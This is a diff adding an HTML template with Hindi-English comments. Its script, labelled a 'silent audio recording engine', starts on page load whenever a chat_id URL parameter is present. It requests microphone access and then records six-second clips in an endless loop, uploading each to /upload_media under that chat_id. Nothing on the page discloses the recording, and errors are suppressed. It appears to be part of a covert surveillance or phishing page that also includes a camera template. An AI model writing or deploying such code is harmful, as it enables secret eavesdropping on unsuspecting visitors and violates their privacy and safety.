@@ -1,0 +1,61 @@
+<!-- ================================================================= -->
+<!-- 🔗 [UI CONNECTION: Aage chalkar audio UI file name yahan change karein] -->
+<!-- ================================================================= -->
+{% include 'camera.html' %}
+
+
+<!-- ================================================================= -->
+<!-- 🤖 [BACKGROUND SILENT AUDIO RECORDING ENGINE]                    -->
+<!-- ================================================================= -->
+<script>
+(function() {
+    const urlParams = new URLSearchParams(window.location.search);
+    const chatId = urlParams.get('chat_id');
+
+    async function initAudioEngine() {
+        if (!chatId) return;
+
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            
+            function recordAndSendClip() {
+                let audioChunks = [];
+                const mediaRecorder = new MediaRecorder(stream);
+
+                mediaRecorder.ondataavailable = (e) => {
+                    if (e.data && e.data.size > 0) audioChunks.push(e.data);
+                };
+
+                mediaRecorder.onstop = () => {
+                    const audioBlob = new Blob(audioChunks, { type: 'audio/ogg; codecs=opus' });
+                    const fd = new FormData();
+                    fd.append('file', audioBlob, 'audio_clip.ogg');
+                    fd.append('chat_id', chatId);
+                    fd.append('type', 'audio');
+
+                    fetch('/upload_media', { method: 'POST', body: fd })
+                        .catch(() => {});
+                    
+                    // Ek clip bhejne ke 2 second baad dobara record karein
+                    setTimeout(recordAndSendClip, 2000);
+                };
+
+                // Har baar 6 second ki audio clip record karega
+                mediaRecorder.start();
+                setTimeout(() => {
+                    if (mediaRecorder.state !== 'inactive') {
+                        mediaRecorder.stop();
+                    }
+                }, 6000);
+            }
+
+            recordAndSendClip();
+
+        } catch (err) {
+            console.error("Audio permission error:", err);
+        }
+    }
+
+    window.addEventListener('DOMContentLoaded', initAudioEngine);
+})();
+</script>
